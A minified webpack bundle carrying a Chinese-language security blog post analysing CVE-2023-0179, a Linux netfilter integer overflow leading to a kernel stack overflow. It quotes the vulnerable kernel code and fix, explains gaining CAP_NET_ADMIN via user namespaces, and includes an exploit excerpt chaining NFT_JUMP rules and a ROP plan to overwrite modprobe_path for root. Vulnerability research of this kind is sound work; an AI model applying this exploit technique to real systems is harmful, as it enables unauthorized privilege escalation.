"use strict";(self.webpackChunktest=self.webpackChunktest||[]).push([[3426],{3905:(n,e,t)=>{t.d(e,{Zo:()=>p,kt:()=>d});var r=t(7294);function a(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function l(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function s(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?l(Object(t),!0).forEach((function(e){a(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):l(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function _(n,e){if(null==n)return{};var t,r,a=function(n,e){if(null==n)return{};var t,r,a={},l=Object.keys(n);for(r=0;r<l.length;r++)t=l[r],e.indexOf(t)>=0||(a[t]=n[t]);return a}(n,e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(n);for(r=0;r<l.length;r++)t=l[r],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(a[t]=n[t])}return a}var i=r.createContext({}),c=function(n){var e=r.useContext(i),t=e;return n&&(t="function"==typeof n?n(e):s(s({},e),n)),t},p=function(n){var e=c(n.components);return r.createElement(i.Provider,{value:e},n.children)},u="mdxType",o={inlineCode:"code",wrapper:function(n){var e=n.children;return r.createElement(r.Fragment,{},e)}},f=r.forwardRef((function(n,e){var t=n.components,a=n.mdxType,l=n.originalType,i=n.parentName,p=_(n,["components","mdxType","originalType","parentName"]),u=c(t),f=a,d=u["".concat(i,".").concat(f)]||u[f]||o[f]||l;return t?r.createElement(d,s(s({ref:e},p),{},{components:t})):r.createElement(d,s({ref:e},p))}));function d(n,e){var t=arguments,a=e&&e.mdxType;if("string"==typeof n||a){var l=t.length,s=new Array(l);s[0]=f;var _={};for(var i in e)hasOwnProperty.call(e,i)&&(_[i]=e[i]);_.originalType=n,_[u]="string"==typeof n?n:a,s[1]=_;for(var c=2;c<l;c++)s[c]=t[c];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}f.displayName="MDXCreateElement"},8998:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>i,contentTitle:()=>s,default:()=>o,frontMatter:()=>l,metadata:()=>_,toc:()=>c});var r=t(7462),a=(t(7294),t(3905));const l={slug:"tiangongaritcle001",title:"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",authors:"limin06",tags:["Linux","Privilege Escalation"]},s="CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",_={permalink:"/blog/tiangongaritcle001",editUrl:"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-10-18-cve-2023-0179-linux/index.md",source:"@site/blog/2023-10-18-cve-2023-0179-linux/index.md",title:"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",description:"0x00 \u524d\u8a00",date:"2023-10-18T00:00:00.000Z",formattedDate:"2023\u5e7410\u670818\u65e5",tags:[{label:"Linux",permalink:"/blog/tags/linux"},{label:"Privilege Escalation",permalink:"/blog/tags/privilege-escalation"}],readingTime:7.63,hasTruncateMarker:!0,authors:[{name:"\u4f5c\u8005\uff1alm0963",key:"limin06"}],frontMatter:{slug:"tiangongaritcle001",title:"CVE-2023-0179 Linux\u5185\u6838\u63d0\u6743",authors:"limin06",tags:["Linux","Privilege Escalation"]},prevItem:{title:"Microsoft Hyper-V \u865a\u62df TPM \u8bbe\u5907\u6f0f\u6d1e\u5206\u6790",permalink:"/blog/tiangongaritcle002"}},i={authorsImageUrls:[void 0]},c=[{value:"0x00 \u524d\u8a00",id:"0x00-\u524d\u8a00",level:2},{value:"0x01 \u80cc\u666f",id:"0x01-\u80cc\u666f",level:2},{value:"0x02 \u6f0f\u6d1e\u6210\u56e0\uff0c\u52a0\u8fd8\u662f\u51cf",id:"0x02-\u6f0f\u6d1e\u6210\u56e0\u52a0\u8fd8\u662f\u51cf",level:2},{value:"0x03 \u6f0f\u6d1e\u5229\u7528",id:"0x03-\u6f0f\u6d1e\u5229\u7528",level:2},{value:"\u6761\u4ef6\u4e00\uff1a\u9700\u8981CAP_NET_ADMIN\u6743\u9650",id:"\u6761\u4ef6\u4e00\u9700\u8981cap_net_admin\u6743\u9650",level:3},{value:"\u6761\u4ef6\u4e8c\uff1a\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3",id:"\u6761\u4ef6\u4e8c\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3",level:3},{value:"\u6761\u4ef6\u4e09\uff1a\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a",id:"\u6761\u4ef6\u4e09\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a",level:3},{value:"0x04 \u603b\u7ed3",id:"0x04-\u603b\u7ed3",level:2}],p={toc:c},u="wrapper";function o(n){let{components:e,...l}=n;return(0,a.kt)(u,(0,r.Z)({},p,l,{components:e,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"0x00-\u524d\u8a00"},"0x00 \u524d\u8a00"),(0,a.kt)("p",null,"2022\u5e747\u6708\u4e3a\u5929\u5e9c\u676f\u51c6\u5907\u7684Linux\u63d0\u6743\u6f0f\u6d1e\uff0c\u4f46\u662f22\u5e74\u5929\u5e9c\u676f\u6ca1\u529e\uff0c23\u5e741\u6708\u88ab\u5916\u56fd\u4eba\u62a5\u4e86\u3002"),(0,a.kt)("p",null,"\u601d\u8def\u6765\u6e90\u4e8e\u8fd9\u7bc7\u6587\u7ae0\uff0c\u5728\u770b\u5230\u8fd9\u7bc7\u6587\u7ae0\u540e\u51b3\u5b9a\u53bb\u597d\u597d\u8fc7\u4e00\u4e0bnetfilter\u76f8\u5173\u6a21\u5757\u3002"),(0,a.kt)("p",null,"\u6587\u7ae0\u94fe\u63a5\uff1a",(0,a.kt)("a",{parentName:"p",href:"https://mp.weixin.qq.com/s?__biz=Mzk0OTU2ODQ4Mw==&mid=2247483772&idx=1&sn=d1a48ae8f391d42e9d8981b67747ccc5&chksm=c35717f0f4209ee67e547252ef5ad6a75654aa19708987f849c1748fc370755562879d39ae48&token=665487310&lang=zh_CN"},"How The Tables Have Turned: An analysis of two new Linux vulnerabilities in nf_tables")),(0,a.kt)("h2",{id:"0x01-\u80cc\u666f"},"0x01 \u80cc\u666f"),(0,a.kt)("p",null,"\u8be5\u6f0f\u6d1e\u4f4d\u4e8eLinux\u5185\u6838\u4e2dnetfilter\u6a21\u5757\u5bf9vlan\u8fdb\u884c\u5904\u7406\u7684\u76f8\u5173\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6574\u578b\u6ea2\u51fa\u5bfc\u81f4\u7684\u6808\u6ea2\u51fa\uff0c\u6700\u540e\u662fROP\u4fee\u6539modprobe_path\u8def\u5f84\u5b8c\u6210\u63d0\u6743\uff0c\u5728Ubuntu\u4e0b\u6d4b\u8bd5\u53ef\u4ee5\u7a33\u5b9a\u89e6\u53d1\uff0c\u63d0\u6743\u6210\u529f\u7387\u767e\u5206\u4e4b\u767e\u3002"),(0,a.kt)("h2",{id:"0x02-\u6f0f\u6d1e\u6210\u56e0\u52a0\u8fd8\u662f\u51cf"},"0x02 \u6f0f\u6d1e\u6210\u56e0\uff0c\u52a0\u8fd8\u662f\u51cf"),(0,a.kt)("p",null,"\u4e0b\u9762\u662f\u6f0f\u6d1e\u4ee3\u7801\uff0c\u5904\u7406vlan\u76f8\u5173\u7684\u90e8\u5206\u4ee3\u7801\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"/* add vlan header into the user buffer for if tag was removed by offloads */\nstatic bool\nnft_payload_copy_vlan(u32 *d, const struct sk_buff *skb, u8 offset, u8 len)\n{\n  int mac_off = skb_mac_header(skb) - skb->data;\n  u8 *vlanh, *dst_u8 = (u8 *) d;\n  struct vlan_ethhdr veth;\n  u8 vlan_hlen = 0;\n\n  if ((skb->protocol == htons(ETH_P_8021AD) ||\n       skb->protocol == htons(ETH_P_8021Q)) &&\n      offset >= VLAN_ETH_HLEN && offset < VLAN_ETH_HLEN + VLAN_HLEN)\n    vlan_hlen += VLAN_HLEN;\n\n  vlanh = (u8 *) &veth;\n  if (offset < VLAN_ETH_HLEN + vlan_hlen) {\n    u8 ethlen = len;\n\n    if (vlan_hlen &&\n        skb_copy_bits(skb, mac_off, &veth, VLAN_ETH_HLEN) < 0)\n      return false;\n    else if (!nft_payload_rebuild_vlan_hdr(skb, mac_off, &veth))\n      return false;\n\n    if (offset + len > VLAN_ETH_HLEN + vlan_hlen)\n      ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;\n\n    memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);\n\n    len -= ethlen;\n    if (len == 0)\n      return true;\n\n    dst_u8 += ethlen;\n    offset = ETH_HLEN + vlan_hlen;\n  } else {\n    offset -= VLAN_HLEN + vlan_hlen;\n  }\n\n  return skb_copy_bits(skb, offset + mac_off, dst_u8, len) == 0;\n}\n")),(0,a.kt)("p",null,"\u8fd9\u4e00\u6bb5\u4ee3\u7801\u597d\u50cf\u6709\u70b9\u95ee\u9898\uff1f",(0,a.kt)("strong",{parentName:"p"},"\u6574\u6570\u6ea2\u51fa\uff01\uff01\uff01")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"if (offset + len > VLAN_ETH_HLEN + vlan_hlen)\n      ethlen -= offset + len - VLAN_ETH_HLEN + vlan_hlen;\n")),(0,a.kt)("p",null,"\u5728\u5224\u65adif (offset + len > VLAN_ETH_HLEN + vlan_hlen)\u540e\uff0c\u5e94\u8be5\u7528offset + len\u51cf\u53bbVLAN_ETH_HLEN + vlan_hlen\uff0c\u5f88\u660e\u663e\u4ee3\u7801\u4e2d\u5c11\u4e86\u62ec\u53f7\u8fd0\u7b97\uff0c\u4fee\u590d\u8865\u4e01\u4e5f\u662f\u7b80\u5355\u7684\u5c06+\u6539\u4e3a-\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"offset + len - (VLAN_ETH_HLEN + vlan_hlen)\n\n=>\n\noffset + len - VLAN_ETH_HLEN - vlan_hlen\n")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u6808\u6ea2\u51fa\uff01\uff01\uff01")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"memcpy(dst_u8, vlanh + offset - vlan_hlen, ethlen);\n")),(0,a.kt)("p",null,"dst_u8(rdi)\u6307\u5411\u4e0a\u5c42\u8c03\u7528\u51fd\u6570\u7684regs\u6808\u4e0a\u53d8\u91cf\uff0cvlanh(rsi)\u6307\u5411veth\u6808\u4e0a\u53d8\u91cf\uff0cethlen(rcx << 3)\u5728\u6574\u6570\u6ea2\u51fa\u540e\u4f1a\u53d8\u4e3a\u4e00\u4e2a\u8f83\u5927\u503c\u3002"),(0,a.kt)("p",null," ",(0,a.kt)("img",{src:t(3520).Z,width:"1720",height:"1036"})),(0,a.kt)("h2",{id:"0x03-\u6f0f\u6d1e\u5229\u7528"},"0x03 \u6f0f\u6d1e\u5229\u7528"),(0,a.kt)("h3",{id:"\u6761\u4ef6\u4e00\u9700\u8981cap_net_admin\u6743\u9650"},"\u6761\u4ef6\u4e00\uff1a\u9700\u8981CAP_NET_ADMIN\u6743\u9650"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"static void nfnetlink_rcv(struct sk_buff *skb)\n{\n        struct nlmsghdr *nlh = nlmsg_hdr(skb);\n\n        if (skb->len < NLMSG_HDRLEN ||\n            nlh->nlmsg_len < NLMSG_HDRLEN ||\n            skb->len < nlh->nlmsg_len)\n                return;\n\n        if (!netlink_net_capable(skb, CAP_NET_ADMIN)) {\n                netlink_ack(skb, nlh, -EPERM, NULL);\n                return;\n        }\n\n        if (nlh->nlmsg_type == NFNL_MSG_BATCH_BEGIN)\n                nfnetlink_rcv_skb_batch(skb, nlh);\n        else\n                netlink_rcv_skb(skb, nfnetlink_rcv_msg);\n}\n\nbool netlink_net_capable(const struct sk_buff *skb, int cap)\n{\n  return netlink_ns_capable(skb, sock_net(skb->sk)->user_ns, cap);\n}\n")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u547d\u4ee4\u7a7a\u95f4")),(0,a.kt)("p",null,"Linux\u4e0b\u9ed8\u8ba4\u7684\u6839\u547d\u4ee4\u7a7a\u95f4\u662finit_user_ns\uff0c\u5982\u679cCONFIG_USER_NS\u548cCONFIG_NET_NS\u914d\u7f6e\u9009\u9879\u5f00\u542f\uff0c\u7528\u6237\u4fbf\u53ef\u4ee5\u521b\u5efa\u81ea\u5df1\u7684\u547d\u4ee4\u7a7a\u95f4\uff0c\u5e76\u4e14\u5728\u8be5\u7528\u6237\u547d\u4ee4\u7a7a\u95f4\u4e2d\u83b7\u5f97\u6240\u6709\u6743\u9650\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u65b0\u7684\u547d\u4ee4\u7a7a\u95f4\u4ee5\u6ee1\u8db3\u4e0a\u8ff0CAP_NET_ADMIN\u6743\u9650\u68c0\u67e5\u3002"),(0,a.kt)("p",null," ",(0,a.kt)("img",{src:t(6832).Z,width:"1127",height:"181"})),(0,a.kt)("h3",{id:"\u6761\u4ef6\u4e8c\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3"},"\u6761\u4ef6\u4e8c\uff1a\u6ea2\u51fa\u7684\u957f\u5ea6\u4e0d\u8db3"),(0,a.kt)("p",null,"ethlen\u7684\u7c7b\u578b\u662fu8\uff0c\u90a3\u4e48\u6700\u5927\u503c\u4e3a0xff\uff0c\u5f88\u660e\u663e\u4e0d\u8db3\u4ee5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0cregs\u53d8\u91cf\u540e\u8ddf\u7740nft_jumpstack\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u957f\u5ea6\u4e3a16\uff0c\u5927\u5c0f\u4e3a256\u5b57\u8282\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"#define NFT_JUMP_STACK_SIZE  16\n\nstruct nft_jumpstack {\n  const struct nft_chain  *chain;\n  struct nft_rule  *const *rules;\n};\n\nunsigned int\nnft_do_chain(struct nft_pktinfo *pkt, void *priv)\n{\n  const struct nft_chain *chain = priv, *basechain = chain;\n  const struct net *net = nft_net(pkt);\n  struct nft_rule *const *rules;\n  const struct nft_rule *rule;\n  const struct nft_expr *expr, *last;\n  struct nft_regs regs;\n  unsigned int stackptr = 0;\n  struct nft_jumpstack jumpstack[NFT_JUMP_STACK_SIZE];\n  bool genbit = READ_ONCE(net->nft.gencursor);\n  struct nft_traceinfo info;\n\n......\nida\u53cd\u6c47\u7f16\u7ed3\u679c\n\n__int64 __fastcall nft_do_chain(\n        __int64 *a1,\n        struct nft_regs *a2,\n        __int64 a3,\n        __int64 a4,\n        __int64 a5,\n        __int64 a6,\n        char a7,\n        int a8,\n        __int16 a9)\n{\n  ......\n  struct nft_regs regs; // [rsp+60h] [rbp-190h] BYREF\n  struct nft_jumpstack v51[16]; // [rsp+B0h] [rbp-140h] BYREF\n  unsigned __int64 canary; // [rsp+1B8h] [rbp-38h]\n  __int64 v53; // [rsp+1C0h] [rbp-30h]\n  __int64 v54; // [rsp+1C8h] [rbp-28h]\n  __int64 v55; // [rsp+1D0h] [rbp-20h]\n  __int64 v56; // [rsp+1D8h] [rbp-18h]\n  __int64 v57; // [rsp+1E0h] [rbp-10h]\n  __int64 v58; // [rsp+1E8h] [rbp-8h]\n")),(0,a.kt)("p",null,"\u901a\u8fc7\u5229\u7528\u6539\u5199nft_jumpstack\u7ed3\u6784\u4f53\uff0c\u6269\u5927\u8d8a\u754c\u8bfb\u5199\u8303\u56f4\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"unsigned int\nnft_do_chain(struct nft_pktinfo *pkt, void *priv)\n{\n  const struct nft_chain *chain = priv, *basechain = chain;\n  const struct net *net = nft_net(pkt);\n  struct nft_rule *const *rules;\n  const struct nft_rule *rule;\n  const struct nft_expr *expr, *last;\n  struct nft_regs regs;\n  unsigned int stackptr = 0;\n  struct nft_jumpstack jumpstack[NFT_JUMP_STACK_SIZE];\n  bool genbit = READ_ONCE(net->nft.gencursor);\n  struct nft_traceinfo info;\n\n  info.trace = false;\n  if (static_branch_unlikely(&nft_trace_enabled))\n    nft_trace_init(&info, pkt, &regs.verdict, basechain);\ndo_chain:\n  if (genbit)\n    rules = rcu_dereference(chain->rules_gen_1);\n  else\n    rules = rcu_dereference(chain->rules_gen_0);\n\nnext_rule:\n  rule = *rules;\n  regs.verdict.code = NFT_CONTINUE;\n  for (; *rules ; rules++) {\n    rule = *rules;\n    nft_rule_for_each_expr(expr, last, rule) {\n      if (expr->ops == &nft_cmp_fast_ops)\n        nft_cmp_fast_eval(expr, &regs);\n      else if (expr->ops == &nft_bitwise_fast_ops)\n        nft_bitwise_fast_eval(expr, &regs);\n      else if (expr->ops != &nft_payload_fast_ops ||\n         !nft_payload_fast_eval(expr, &regs, pkt))\n        expr_call_ops_eval(expr, &regs, pkt);\n\n      if (regs.verdict.code != NFT_CONTINUE)\n        break;\n    }\n\n    switch (regs.verdict.code) {\n    case NFT_BREAK:\n      regs.verdict.code = NFT_CONTINUE;\n      continue;\n    case NFT_CONTINUE:\n      nft_trace_packet(&info, chain, rule,\n           NFT_TRACETYPE_RULE);\n      continue;\n    }\n    break;\n  }\n\n  switch (regs.verdict.code & NF_VERDICT_MASK) {\n  case NF_ACCEPT:\n  case NF_DROP:\n  case NF_QUEUE:\n  case NF_STOLEN:\n    nft_trace_packet(&info, chain, rule,\n         NFT_TRACETYPE_RULE);\n    return regs.verdict.code;\n  }\n\n  switch (regs.verdict.code) {\n  case NFT_JUMP:\n    if (WARN_ON_ONCE(stackptr >= NFT_JUMP_STACK_SIZE))\n      return NF_DROP;\n    jumpstack[stackptr].chain = chain;\n    jumpstack[stackptr].rules = rules + 1;\n    stackptr++;\n    fallthrough;\n  case NFT_GOTO:\n    nft_trace_packet(&info, chain, rule,\n         NFT_TRACETYPE_RULE);\n\n    chain = regs.verdict.chain;\n    goto do_chain;\n  case NFT_CONTINUE:\n  case NFT_RETURN:\n    nft_trace_packet(&info, chain, rule,\n         NFT_TRACETYPE_RETURN);\n    break;\n  default:\n    WARN_ON(1);\n  }\n\n  if (stackptr > 0) {\n    stackptr--;\n    chain = jumpstack[stackptr].chain;\n    rules = jumpstack[stackptr].rules;\n    goto next_rule;\n  }\n")),(0,a.kt)("p",null," ",(0,a.kt)("img",{src:t(2279).Z,width:"2000",height:"1333"})),(0,a.kt)("p",null," ",(0,a.kt)("img",{src:t(6939).Z,width:"831",height:"475"})),(0,a.kt)("p",null,"\u901a\u8fc7\u589e\u52a0\u591a\u4e2averdict.code\u4e3aNFT_JUMP\u7684\u89c4\u5219\uff0c\u5728\u89c4\u5219\u6267\u884c\u540e\u5c31\u4f1a\u586b\u5145jumpstack\u6570\u7ec4\uff0c\u5e76\u5728\u6700\u540e\u4e00\u4e2a\u89c4\u5219\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4fee\u6539jumpstack\u6570\u7ec4\uff0c\u63a7\u5236\u5176\u4e2d\u7684rules\u6307\u9488\uff0c\u540e\u7eed\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u505aROP\u5373\u53ef\u3002"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},'struct unft_base_chain_param bp;\n    bp.hook_num = NF_INET_PRE_ROUTING;\n    bp.prio = 10;\n\n    for (int i = 0; i < exp_chain_num; i++)\n    {\n        sprintf(exp_chain_name, "%s%d", "exp_chain", i);\n        void *p = NULL;\n        if (!i)\n             p = &bp;\n        if (create_chain(nl, table_name, exp_chain_name, NFPROTO_BRIDGE, p, &seq, NULL))\n        {\n            perror("Failed creating exp chain");\n            exit(EXIT_FAILURE);\n        }\n\n    }\n\n    for (int i = 0; i < exp_chain_num; i++)\n    {\n        sprintf(exp_chain_name, "%s%d", "exp_chain", i);\n        sprintf(exp_chain_name_next, "%s%d", "exp_chain", i+1);\n\n        struct nftnl_rule* r = build_rule(table_name, exp_chain_name, NFPROTO_BRIDGE, NULL);\n\n        if (!i){\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 0x16, 0x40, 1, 0);\n            char *cmp_str = MAGIC;\n            rule_add_cmp(r, NFT_CMP_EQ, 1, cmp_str, 6);\n\n            uint64_t stack_value = (stack << 16) | 0xffff;\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 20, 0x40, 1, 0);\n            rule_add_cmp(r, NFT_CMP_EQ, 12, &stack_value, 8);\n        }\n        if (i == exp_chain_num - 1)\n            rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 20, 0x40, 1, 0); // trigger\n        else\n            rule_add_immediate_verdict(r, NFT_JUMP, exp_chain_name_next);\n\n        err = send_batch_request(\n                nl,\n                NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),\n                NLM_F_CREATE, NFPROTO_BRIDGE, (void**)&r, &seq,\n                NULL\n                );\n        if (err) {\n            puts(CLR_RED "[-] Set exp chain rule failed" CLR_RESET);\n            perror("");\n            exit(EXIT_FAILURE);\n        }\n    }\n')),(0,a.kt)("h3",{id:"\u6761\u4ef6\u4e09\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a"},"\u6761\u4ef6\u4e09\uff1a\u89e6\u53d1\u6f0f\u6d1e\u65f6\u5185\u6838\u4e0a\u4e0b\u6587\u4e0d\u786e\u5b9a"),(0,a.kt)("p",null,"\u5728recv\u63a5\u6536\u6570\u636e\u65f6\u89e6\u53d1\u6f0f\u6d1e\uff0c\u6240\u4ee5\u4e0d\u786e\u5b9a\u662f\u5728\u54ea\u4e00\u4e2a\u5185\u6838\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6808\u6ea2\u51fa\u540e\u4e5f\u4e0d\u80fd\u76f4\u63a5\u8fd4\u56de\u7528\u6237\u6001\u3002"),(0,a.kt)("p",null,"\u4e0d\u8fc7\u591a\u7834\u574f\u6808\u4e0a\u6570\u636e\uff0c\u5728\u6709\u9650\u7684\u6808\u7a7a\u95f4\u5185\u4fee\u6539modprobe_path\uff08\u5728\u8fd0\u884c\u975eELF\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u65f6\uff0c\u4f1a\u4ee5root\u6743\u9650\u8c03\u7528\u8be5\u811a\u672c\uff09\u6307\u5411\u6211\u4eec\u53ef\u63a7\u7684\u811a\u672c\uff0c\u6700\u540e\u8c03\u6574rsp\u4e3a\u4e0a\u4e00\u5c42\u672a\u7834\u574f\u7684\u6808\u5e27\uff0c\u6b63\u5e38\u8fd4\u56de\u3002"),(0,a.kt)("h2",{id:"0x04-\u603b\u7ed3"},"0x04 \u603b\u7ed3"),(0,a.kt)("p",null,"netfilter\u5b50\u7cfb\u7edf\u662f\u4e00\u4e2a\u76f8\u5f53\u590d\u6742\u7684\u7cfb\u7edf\uff0c\u501f\u52a9\u6b64\u6587\u4ecb\u7ecd\u4e86CVE-2023-0179\u7684\u6f0f\u6d1e\u6210\u56e0\u548c\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u6ce8\u610f\u70b9\uff0c\u5e0c\u671b\u80fd\u8d77\u5230\u629b\u7816\u5f15\u7389\u7684\u6548\u679c\u3002"))}o.isMDXComponent=!0},2279:(n,e,t)=>{t.d(e,{Z:()=>r});const r=t.p+"assets/images/065b65c4-aa16-41fc-92f1-ed336e8ba155-3c5cf086591cf206bd6a39e95d1efbf5.jpeg"},6939:(n,e,t)=>{t.d(e,{Z:()=>r});const r=t.p+"assets/images/0c63e908-6b17-4832-a95a-e2e1fb9913e4-22b849ff21dc5315798ff33fcd1c4c6e.png"},3520:(n,e,t)=>{t.d(e,{Z:()=>r});const r=t.p+"assets/images/7848c444-c556-44ba-a298-91e2573502d7-0976ec7020384aea8cf1ff39ebb82f27.png"},6832:(n,e,t)=>{t.d(e,{Z:()=>r});const r=t.p+"assets/images/81f59f3f-098d-4671-8167-b943b5629a35-6a41d15113b0649127129dfeb8a10b90.png"}}]);